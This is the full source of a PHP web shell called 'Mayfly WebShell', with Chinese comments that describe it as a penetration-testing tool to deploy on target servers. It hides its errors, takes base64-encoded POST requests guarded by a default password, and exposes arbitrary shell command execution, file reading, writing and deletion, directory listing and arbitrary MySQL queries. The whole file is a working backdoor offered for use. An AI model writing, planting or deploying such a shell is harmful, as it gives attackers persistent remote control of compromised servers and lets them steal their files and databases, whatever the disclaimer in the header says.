<?php
/**
 * ============================================================
 *  Mayfly WebShell - PHP 服务端脚本
 *  仅用于授权渗透测试与自有资产管理，禁止用于未授权访问。
 *  部署到目标服务器后，请修改 $key 为高强度连接密码。
 * ============================================================
 */
@error_reporting(0);
@set_time_limit(0);
@ini_set('display_errors', '0');

// 连接密码：POST 字段名（与客户端"连接密码"保持一致）
$key = 'mayfly';

function mayfly_resp($status, $data, $msg = '') {
    $r = array('status' => $status, 'data' => base64_encode((string)$data), 'message' => $msg);
    echo base64_encode(json_encode($r));
    exit;
}

// 读取 payload
$payload = '';
foreach (array($key, 'mayfly') as $k) {
    if (isset($_POST[$k]) && $_POST[$k] !== '') { $payload = $_POST[$k]; break; }
}
if ($payload === '') {
    mayfly_resp('error', '', 'empty payload');
}

$json = base64_decode($payload);
if ($json === false) mayfly_resp('error', '', 'bad base64');
$req = json_decode($json, true);
if (!is_array($req)) mayfly_resp('error', '', 'bad json');

$action = isset($req['action']) ? $req['action'] : '';
$params = isset($req['params']) && is_array($req['params']) ? $req['params'] : array();

function mf_run_cmd($cmd) {
    if (function_exists('shell_exec')) {
        $out = @shell_exec($cmd . ' 2>&1');
        return $out === null ? '' : $out;
    }
    if (function_exists('exec')) {
        $out = array();
        @exec($cmd . ' 2>&1', $out);
        return implode("\n", $out);
    }
    if (function_exists('system')) {
        ob_start(); @system($cmd . ' 2>&1'); $o = ob_get_clean();
        return $o === false ? '' : $o;
    }
    if (function_exists('passthru')) {
        ob_start(); @passthru($cmd . ' 2>&1'); $o = ob_get_clean();
        return $o === false ? '' : $o;
    }
    return false;
}

switch ($action) {

    case 'cmd':
        $cmd = isset($params['cmd']) ? $params['cmd'] : '';
        if ($cmd === '') mayfly_resp('error', '', 'empty cmd');
        $out = mf_run_cmd($cmd);
        if ($out === false) mayfly_resp('error', '', 'no exec function available');
        mayfly_resp('ok', $out);
        break;

    case 'sysinfo':
        $php = PHP_VERSION;
        $os  = PHP_OS;
        $cwd = getcwd();
        $user = mf_run_cmd('whoami'); if ($user === false) $user = 'unknown';
        $info = "PHP: {$php}\nOS: {$os}\nUser: " . trim($user) . "\nCWD: {$cwd}";
        mayfly_resp('ok', $info);
        break;

    case 'fileList':
        $path = isset($params['path']) ? $params['path'] : getcwd();
        if ($path === '' || $path === null) $path = getcwd();
        $path = str_replace('\\', '/', $path);
        if (!is_dir($path)) mayfly_resp('error', '', 'not a directory: ' . $path);
        $lines = array();
        if (!@chdir($path)) mayfly_resp('error', '', 'cannot enter dir: ' . $path);
        $cur = getcwd();
        $parent = dirname($cur);
        $lines[] = "d|0|0|..\t" . $parent;
        $files = @scandir($cur);
        if ($files === false) mayfly_resp('error', '', 'cannot read dir');
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            $full = $cur . '/' . $f;
            if (is_dir($full)) {
                $lines[] = 'd|0|' . @filemtime($full) . '|' . $f;
            } else {
                $lines[] = 'f|' . @filesize($full) . '|' . @filemtime($full) . '|' . $f;
            }
        }
        // 附带当前路径
        mayfly_resp('ok', $cur . "\n" . implode("\n", $lines));
        break;

    case 'fileRead':
        $path = isset($params['path']) ? $params['path'] : '';
        if ($path === '' || !is_file($path) || !is_readable($path)) mayfly_resp('error', '', 'cannot read file');
        $c = @file_get_contents($path);
        if ($c === false) mayfly_resp('error', '', 'read failed');
        mayfly_resp('ok', $c);
        break;

    case 'fileWrite':
        $path = isset($params['path']) ? $params['path'] : '';
        if ($path === '') mayfly_resp('error', '', 'empty path');
        $content = isset($params['content']) ? base64_decode($params['content']) : '';
        $r = @file_put_contents($path, $content);
        if ($r === false) mayfly_resp('error', '', 'write failed');
        mayfly_resp('ok', 'written ' . $r . ' bytes');
        break;

    case 'fileDelete':
        $path = isset($params['path']) ? $params['path'] : '';
        if ($path === '') mayfly_resp('error', '', 'empty path');
        $ok = is_dir($path) ? @rmdir($path) : @unlink($path);
        if (!$ok) mayfly_resp('error', '', 'delete failed');
        mayfly_resp('ok', 'deleted');
        break;

    case 'fileRename':
        $path = isset($params['path']) ? $params['path'] : '';
        $new  = isset($params['newPath']) ? $params['newPath'] : '';
        if ($path === '' || $new === '') mayfly_resp('error', '', 'empty path');
        if (!@rename($path, $new)) mayfly_resp('error', '', 'rename failed');
        mayfly_resp('ok', 'renamed');
        break;

    case 'fileMkdir':
        $path = isset($params['path']) ? $params['path'] : '';
        if ($path === '') mayfly_resp('error', '', 'empty path');
        if (!@mkdir($path, 0755, true)) mayfly_resp('error', '', 'mkdir failed');
        mayfly_resp('ok', 'created');
        break;

    case 'dbQuery':
        $type = isset($params['dbType']) ? strtolower($params['dbType']) : 'mysql';
        $host = isset($params['dbHost']) ? $params['dbHost'] : '127.0.0.1';
        $port = isset($params['dbPort']) ? $params['dbPort'] : '3306';
        $user = isset($params['dbUser']) ? $params['dbUser'] : 'root';
        $pass = isset($params['dbPass']) ? $params['dbPass'] : '';
        $name = isset($params['dbName']) ? $params['dbName'] : '';
        $sql  = isset($params['sql']) ? $params['sql'] : '';
        if ($sql === '') mayfly_resp('error', '', 'empty sql');

        $rows = array();
        $cols = array();
        $conn = false;

        if ($type === 'mysql' && class_exists('PDO')) {
            try {
                $dsn = "mysql:host={$host};port={$port}";
                if ($name !== '') $dsn .= ";dbname={$name}";
                $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 10));
                $conn = true;
                $st = $pdo->query($sql);
                if ($st) {
                    $cols = array();
                    for ($i = 0; $i < $st->columnCount(); $i++) {
                        $m = $st->getColumnMeta($i);
                        $cols[] = isset($m['name']) ? $m['name'] : ('col' . $i);
                    }
                    $rows = $st->fetchAll(PDO::FETCH_NUM);
                }
            } catch (Exception $e) {
                mayfly_resp('error', '', 'db: ' . $e->getMessage());
            }
        } elseif ($type === 'mysql' && class_exists('mysqli')) {
            $m = new mysqli($host, $user, $pass, $name !== '' ? $name : null, (int)$port);
            if ($m->connect_errno) mayfly_resp('error', '', 'db: ' . $m->connect_error);
            $conn = true;
            $res = $m->query($sql);
            if ($res === false) mayfly_resp('error', '', 'db: ' . $m->error);
            if ($res === true) {
                $rows = array(); $cols = array();
            } else {
                $cols = array();
                while ($f = $res->fetch_field()) $cols[] = $f->name;
                while ($r = $res->fetch_row()) $rows[] = $r;
                $res->free();
            }
            $m->close();
        } else {
            mayfly_resp('error', '', "unsupported db type or driver: {$type}");
        }

        // 输出：第一行列名（tab 分隔），后续每行数据
        $out = implode("\t", $cols) . "\n";
        foreach ($rows as $r) {
            foreach ($r as $i => $v) { if ($v === null) $r[$i] = 'NULL'; }
            $out .= implode("\t", $r) . "\n";
        }
        mayfly_resp('ok', $out);
        break;

    default:
        mayfly_resp('error', '', 'unknown action: ' . $action);
}
?>